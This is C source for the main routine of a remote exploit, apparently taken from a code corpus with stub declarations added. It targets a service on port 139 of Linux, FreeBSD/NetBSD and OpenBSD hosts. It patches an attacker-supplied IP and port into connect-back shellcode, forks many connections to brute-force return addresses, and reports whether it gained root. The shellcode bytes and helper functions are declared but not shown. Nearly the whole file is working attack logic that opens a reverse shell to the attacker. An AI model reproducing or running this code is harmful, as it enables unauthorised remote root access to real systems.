#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_addr; void* sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  addr1 ;
typedef  void* a_port ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  GoAway ; 
 scalar_t__ LOOP ; 
 scalar_t__ SIGUSR2 ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int atoi (char*) ; 
 char* bsd_connect_back ; 
 int* childs ; 
 int client ; 
 int /*<<< orphan*/  close (int) ; 
 int connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  exploit_normal (int,unsigned long,char*) ; 
 int /*<<< orphan*/  exploit_openbsd32 (int,unsigned long,char*) ; 
 scalar_t__ exploit_pid ; 
 int fork () ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* gethostbyname (char*) ; 
 scalar_t__ getpid () ; 
 void* htons (int) ; 
 scalar_t__ inet_ntoa (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  kill (scalar_t__,scalar_t__) ; 
 char* linux_connect_back ; 
 scalar_t__ listen_pid ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int port_listen ; 
 int /*<<< orphan*/  signal (scalar_t__,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int sock_listen ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  sscanf (char*,char*,int*,int*,int*,int*) ; 
 int /*<<< orphan*/  start_listen () ; 
 int /*<<< orphan*/  start_session (int) ; 
 int stat (char*,struct stat*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  usage (char*) ; 
 int /*<<< orphan*/  usleep (int) ; 
 int /*<<< orphan*/  wait (int*) ; 

int
main (int argc,char *argv[])
{
   char *shellcode = NULL;
   int typeos	= -1;
   int port		= 139;
   int sock		= 0;
   int i		= 0;
   int status	= 0;
   int m		= 0;
   int ip1		= 0;
   int ip2		= 0;
   int ip3		= 0;
   int ip4		= 0;
   int sta		= 0;
   int STEPS	= 512;
   int ENDLOOP    = 64;
   char *desc; 
   unsigned long MAX_CHILDS  = 40;
   unsigned long ret         = 0x0;
   unsigned short int  a_port;
   struct sockaddr_in addr1;
   struct hostent *he;
   struct stat st;
   
      if (argc != 4) usage(argv[0]);
   
      typeos = atoi(argv[1]);
      if (typeos > 3) {
          fprintf(stdout, "Os type out of list!\n");
          exit(1);
      }

      he = gethostbyname(argv[2]);

      if (he == NULL) {
          fprintf(stderr, "Unable to resolve\n");
          return -1;
      }

      listen_pid = getpid();
      start_listen();
      exploit_pid = listen_pid + 1;

      //fprintf(stdout, "[+] Listen pid: %d, exploit pid: %d\n", listen_pid,exploit_pid);

      sscanf(argv[3], "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);		
      linux_connect_back[171] = ip1; bsd_connect_back[162] = ip1;
      linux_connect_back[172] = ip2; bsd_connect_back[163] = ip2;
      linux_connect_back[173] = ip3; bsd_connect_back[164] = ip3;
      linux_connect_back[174] = ip4; bsd_connect_back[165] = ip4;
				
      fprintf(stdout, "[+] Connecting back to: [%d.%d.%d.%d:%d]\n", 
					ip1, ip2, ip3, ip4, port_listen);

      a_port = htons(port_listen);
      
      linux_connect_back[177]= (a_port) & 0xff;
      linux_connect_back[178]= (a_port >> 8) & 0xff;
      bsd_connect_back[168]= (a_port) & 0xff;
      bsd_connect_back[169]= (a_port >> 8) & 0xff;

      switch(typeos) {
      case 0:
              desc = "Linux";
              ret = 0xc0000000;
              shellcode = linux_connect_back;
              break;
      case 1:
              desc = "FreeBSD/NetBSD";
              ret = 0xbfc00000;
              shellcode = bsd_connect_back;
              break;
      case 2:
              desc = "OpenBSD 3.1 and prior";
              ret = 0xdfc00000;
              shellcode = bsd_connect_back;
              break;
      case 3:
              desc = "OpenBSD 3.2 non-exec stack";
              ret = 0x00170000;
              shellcode = bsd_connect_back;
              break;
      }

      fprintf(stdout, "[+] Target: %s\n", desc);
      memcpy(&addr1.sin_addr, he->h_addr, he->h_length);

      addr1.sin_family = AF_INET;
      addr1.sin_port	 = htons(port);	

      fprintf(stdout, "[+] Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr), port);
      fprintf(stdout, "[+] Please wait in seconds...!\n");

      signal(SIGUSR2, GoAway);
   
      for (i = 0; i < 50; i++) childs[i] = -1;
      i = 0; m = 0;

      while (LOOP) {

           if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
              fprintf(stderr, "[+] socket() error.\n");
              exit(-1);
           }

           ret -= STEPS; i++;
           if ((ret & 0xff) == 0x00 && typeos != 3) ret++;             

           m++; 
           //fflush(0);
           //fprintf(stdout, "[+] Return Address: 0x%08x [%02d]\n", (unsigned int)ret, m);

           usleep(150000);

           switch (childs[i] = fork()) {
           case 0:  
                  if (connect(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) { 
                      //fprintf(stderr, "[+] connect() error.\n");
                      close(sock);
                      exit(-1);
                  }
			
                 start_session(sock);
                 sleep(3);
		     		         
                 if (typeos != 3) {
                           if (exploit_normal(sock, ret, shellcode) < 0) {
                              //fprintf(stderr, " -> Failed.\n");
                              close(sock);
                              exit(-1);
                           }
                 } else {
                           if (exploit_openbsd32(sock, ret, shellcode) < 0) {
                              //fprintf(stderr, " -> Failed.\n");
                              close(sock);
                              exit(-1);
                           }
                  }
                  sleep(5);
                  close(sock);
                  exit(0);
                  break;
           case -1:
                  exit(-1);
                  break;
           default:
                  if (i > MAX_CHILDS - 2) {
                      wait(&status);
                      i--;
                  }
                  break;
           } 

           if (m == ENDLOOP) LOOP = 0;
      } 	   

      if (stat(".ROOT", &st) != -1) 
         kill(SIGUSR2, listen_pid);
      else {	
           fprintf(stdout, "[+] Dohh, exploit failed.\n");
	   close(client); close(sock_listen);
           kill(listen_pid, SIGUSR2);
	   sleep(2);
	   exit(0);
      }
}